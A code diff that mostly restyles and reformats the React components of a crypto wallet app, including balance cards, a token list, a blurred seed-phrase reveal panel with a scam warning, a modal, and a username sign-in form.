+              <div className="mt-3 flex items-center justify-between border-t border-border pt-3">
+                <span className="text-[10px] uppercase tracking-widest text-muted-foreground">
+                  Balance
+                </span>
                 <span className="font-mono text-sm">
                   {balances[a.chain] === "loading" || balances[a.chain] === undefined ? (
                     <Loader2 className="h-3.5 w-3.5 animate-spin text-muted-foreground" />
                   ) : (
                     <>
                       {(balances[a.chain] as Balance).amount.toFixed(6)}{" "}
-                      <span className="text-muted-foreground">{(balances[a.chain] as Balance).symbol}</span>
+                      <span className="text-muted-foreground">
+                        {(balances[a.chain] as Balance).symbol}
+                      </span>
                     </>
                   )}
                 </span>
@@ -761,7 +940,10 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
           ))}
 
           {apepeCards.map((c) => (
-            <div key={`APEPE-${c.chain}`} className="glass rounded-xl p-4 hover:bg-white/[.04] transition">
+            <div
+              key={`APEPE-${c.chain}`}
+              className="rounded-lg border border-border bg-surface p-4 hover:border-primary/30 transition"
+            >
               <div className="flex items-start justify-between gap-2">
                 <div className="min-w-0">
                   <p className="text-sm font-semibold">Apepe</p>
@@ -769,18 +951,32 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
                     APEPE · {c.standard}
                   </p>
                 </div>
-                <button
-                  onClick={() => copy(c.addr!.address, `APEPE-${c.chain}`)}
-                  className="shrink-0 rounded-md glass px-2 py-1.5 hover:bg-white/10"
+                <Button
+                  variant="outline"
+                  size="icon"
+                  onClick={() => {
+                    if (c.addr) void copy(c.addr.address, `APEPE-${c.chain}`);
+                  }}
+                  className="shrink-0 rounded-md glass px-2 py-1.5 hover:bg-muted"
                   aria-label="Copy address"
                 >
-                  {copied === `APEPE-${c.chain}` ? <Check className="h-3.5 w-3.5 text-success" /> : <Copy className="h-3.5 w-3.5" />}
-                </button>
+                  {copied === `APEPE-${c.chain}` ? (
+                    <Check className="h-3.5 w-3.5 text-success" />
+                  ) : (
+                    <Copy className="h-3.5 w-3.5" />
+                  )}
+                </Button>
               </div>
-              <p className="mt-3 font-mono text-xs break-all text-muted-foreground">{c.addr!.address}</p>
-              <p className="mt-2 text-[10px] font-mono text-muted-foreground/70 break-all">{c.addr!.path}</p>
-              <div className="mt-3 flex items-center justify-between gap-2 border-t border-white/5 pt-3">
-                <span className="text-[10px] uppercase tracking-widest text-muted-foreground">Balance</span>
+              <p className="mt-3 font-mono text-xs break-all text-muted-foreground">
+                {c.addr?.address}
+              </p>
+              <p className="mt-2 text-[10px] font-mono text-muted-foreground/70 break-all">
+                {c.addr?.path}
+              </p>
+              <div className="mt-3 flex items-center justify-between gap-2 border-t border-border pt-3">
+                <span className="text-[10px] uppercase tracking-widest text-muted-foreground">
+                  Balance
+                </span>
                 <span className="font-mono text-sm text-right break-all">
                   {(c.token?.amount ?? 0).toLocaleString(undefined, { maximumFractionDigits: 6 })}{" "}
                   <span className="text-muted-foreground">APEPE</span>
@@ -788,15 +984,15 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
               </div>
             </div>
           ))}
-
         </div>
       </div>
 
-
       {tokens.length > 0 && (
-        <div className="glass rounded-2xl p-6">
+        <div className="border-t border-border py-6">
           <h3 className="font-display text-lg font-semibold mb-1">Tokens</h3>
-          <p className="mb-4 text-xs text-muted-foreground">ERC-20 and SPL tokens received on any supported chain.</p>
+          <p className="mb-4 text-xs text-muted-foreground">
+            ERC-20 and SPL tokens received on any supported chain.
+          </p>
           <div className="grid gap-3 sm:grid-cols-2">
             {tokens.map((t) => (
               <div key={`${t.chain}-${t.symbol}`} className="glass rounded-xl p-4">
@@ -808,14 +1004,18 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
                     </p>
                   </div>
                   <div className="text-right">
-                    <p className="font-mono text-sm">{t.amount.toLocaleString(undefined, { maximumFractionDigits: 6 })}</p>
+                    <p className="font-mono text-sm">
+                      {t.amount.toLocaleString(undefined, { maximumFractionDigits: 6 })}
+                    </p>
                     <p className="text-xs text-muted-foreground">
                       {formatUSD(t.usd, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                     </p>
                   </div>
                 </div>
                 {t.contract && (
-                  <p className="mt-3 font-mono text-[10px] break-all text-muted-foreground/70">{t.contract}</p>
+                  <p className="mt-3 font-mono text-[10px] break-all text-muted-foreground/70">
+                    {t.contract}
+                  </p>
                 )}
               </div>
             ))}
@@ -823,33 +1023,156 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
         </div>
       )}
 
+      <div className="border-b border-border bg-surface px-5 py-6 sm:px-6">
+        <div className="flex flex-wrap items-start justify-between gap-3">
+          <div>
+            <p className="text-xs uppercase tracking-widest text-muted-foreground">Wallet</p>
+            <h2 className="mt-1 font-display text-2xl font-semibold">{wallet.label}</h2>
+            <p className="mt-1 text-xs text-muted-foreground">
+              Created {new Date(wallet.createdAt).toLocaleString()}
+            </p>
+          </div>
+          <div className="flex gap-2">
+            <Button
+              variant="outline"
+              onClick={exportJson}
+              className="inline-flex items-center gap-2 rounded-lg glass px-3 py-2 text-xs font-semibold hover:bg-muted"
+            >
+              <Download className="h-3.5 w-3.5" /> Export addresses
+            </Button>
+            <Button
+              variant="outline"
+              onClick={onDelete}
+              className="inline-flex items-center gap-2 rounded-lg glass px-3 py-2 text-xs font-semibold text-destructive hover:bg-destructive/10"
+            >
+              <Trash2 className="h-3.5 w-3.5" /> Remove
+            </Button>
+          </div>
+        </div>
+
+        {wallet.mnemonic ? (
+          <div className="mt-6 rounded-xl border border-warning/30 bg-warning/5 p-4">
+            <div className="flex items-center justify-between gap-2">
+              <div className="flex items-center gap-2">
+                <KeyRound className="h-4 w-4 text-warning" />
+                <span className="text-sm font-semibold">Seed phrase</span>
+                <span className="text-[10px] uppercase tracking-widest text-muted-foreground">
+                  BIP39
+                </span>
+              </div>
+              <Button
+                variant="outline"
+                onClick={() => setRevealed(true)}
+                className="inline-flex items-center gap-1 rounded-md glass px-2.5 py-1.5 text-xs hover:bg-muted"
+              >
+                <Eye className="h-3.5 w-3.5" />
+                Reveal
+              </Button>
+            </div>
+            <div className="mt-4 grid grid-cols-3 sm:grid-cols-4 gap-2 relative select-none">
+              {words.map((w, i) => (
+                <div
+                  key={i}
+                  className="glass rounded-md px-3 py-2 font-mono text-sm flex items-center gap-2"
+                >
+                  <span className="text-[10px] text-muted-foreground w-4">{i + 1}</span>
+                  <span className="blur-sm tracking-widest">{w}</span>
+                </div>
+              ))}
+              <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
+                <span className="rounded-md glass px-3 py-1.5 text-xs text-muted-foreground">
+                  Click Reveal to view
+                </span>
+              </div>
+            </div>
+            <p className="mt-3 flex items-start gap-1.5 text-[11px] text-warning">
+              <AlertTriangle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
+              Anyone with this phrase can take all of your funds. Never share it — anyone who asks
+              for it is a scammer.
+            </p>
+            {revealed && (
+              <RevealPhraseFlow
+                mnemonic={wallet.mnemonic ?? ""}
+                onClose={() => setRevealed(false)}
+              />
+            )}
+          </div>
+        ) : null}
+
+        <p className="mt-4 text-xs text-muted-foreground flex items-start gap-2">
+          <ShieldCheck className="h-4 w-4 shrink-0 text-success mt-0.5" />
+          {wallet.mnemonic
+            ? "This phrase never leaves your device. PrimeCapital cannot recover it if lost."
+            : "This wallet is signed in on this device. Re-import the seed phrase to reveal recovery words again."}
+        </p>
+      </div>
     </section>
   );
 }
 
-function WalletBalanceStat({ title, value, caption, tone, changePct, showYieldEligible }: { title: string; value: number; caption: string; tone?: "up" | "down"; changePct?: number | null; showYieldEligible?: boolean }) {
+function WalletBalanceStat({
+  title,
+  value,
+  caption,
+  tone,
+  changePct,
+  showYieldEligible,
+}: {
+  title: string;
+  value: number;
+  caption: string;
+  tone?: "up" | "down";
+  changePct?: number | null;
+  showYieldEligible?: boolean;
+}) {
   return (
-    <div className="glass rounded-xl p-4">
+    <div className="border-l border-border px-4 py-2">
       <div className="flex items-start justify-between gap-2">
         <p className="text-[10px] uppercase tracking-widest text-muted-foreground">{title}</p>
         {changePct != null && <ChangeBadge pct={changePct} />}
       </div>
-      <p className="mt-1 font-display text-xl font-semibold">{formatUSD(value, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</p>
+      <p className="mt-1 font-mono text-xl font-semibold break-all">
+        {formatUSD(value, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+      </p>
       <div className="mt-1 flex items-center gap-2 flex-wrap">
-        <span className={cn("text-xs text-muted-foreground", tone === "up" && "text-success", tone === "down" && "text-destructive")}>{caption}</span>
+        <span
+          className={cn(
+            "text-xs text-muted-foreground",
+            tone === "up" && "text-success",
+            tone === "down" && "text-destructive",
+          )}
+        >
+          {caption}
+        </span>
       </div>
       {showYieldEligible && <YieldEligibleNote />}
     </div>
   );
 }
 
-function Modal({ children, onClose, title }: { children: React.ReactNode; onClose: () => void; title: string }) {
+function Modal({
+  children,
+  onClose,
+  title,
+}: {
+  children: React.ReactNode;
+  onClose: () => void;
+  title: string;
+}) {
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in-0">
-      <div className="w-full max-w-md glass-strong rounded-2xl p-6 shadow-elev">
+    <div className="fixed inset-0 z-[70] flex items-center justify-center p-4 bg-background/80 backdrop-blur-sm animate-in fade-in-0">
+      <div className="w-full max-w-md max-h-[85vh] overflow-y-auto glass-strong rounded-lg p-6 shadow-elev">
         <div className="flex items-center justify-between mb-4">
           <h3 className="font-display text-lg font-semibold">{title}</h3>
-          <button onClick={onClose} className="rounded-md p-1.5 hover:bg-white/10 text-muted-foreground">✕</button>
+          <Button
+            variant="ghost"
+            size="icon"
+            aria-label="Close wallet dialog"
+            onClick={onClose}
+            className="rounded-md p-1.5 hover:bg-muted text-muted-foreground"
+          >
+            ✕
+          </Button>
         </div>
         {children}
       </div>
@@ -866,7 +1189,8 @@ function UsernameForm({
   mode: "create" | "import";
   onDone: (username: string, phone?: string) => void;
 }) {
-  const address = wallet.addresses.find((a) => a.chain === "ETH")?.address ?? wallet.addresses[0]?.address ?? "";
+  const address =
+    wallet.addresses.find((a) => a.chain === "ETH")?.address ?? wallet.addresses[0]?.address ?? "";
   const [username, setUsername] = useState("");
   const [phone, setPhone] = useState("");
   const [busy, setBusy] = useState(true);
@@ -889,7 +1213,9 @@ function UsernameForm({
         if (!cancelled) setBusy(false);
       }
     })();
-    return () => { cancelled = true; };
+    return () => {
+      cancelled = true;
+    };
   }, [address]);
 
   const submit = async (e: React.FormEvent) => {
@@ -935,7 +1261,7 @@ function UsernameForm({
       </div>
 
       {existing ? (
-        <div className="rounded-lg border border-success/30 bg-success/10 p-3 text-xs text-success-foreground/90 flex gap-2">
+        <div className="rounded-lg border border-success/30 bg-success/10 p-3 text-xs text-success flex gap-2">
           <Check className="h-4 w-4 shrink-0 text-success mt-0.5" />
           <p>
             This wallet is already registered as{" "}
@@ -978,13 +1304,13 @@ function UsernameForm({
 
       {err && <p className="text-xs text-destructive">{err}</p>}
 
-      <button
+      <Button
         disabled={busy}
         className="inline-flex w-full items-center justify-center gap-2 rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow disabled:opacity-60"
       >
         {busy ? <Loader2 className="h-4 w-4 animate-spin" /> : <LogIn className="h-4 w-4" />}
         {existing ? "Sign in" : "Register & sign in"}
-      </button>
+      </Button>
     </form>
   );
 }
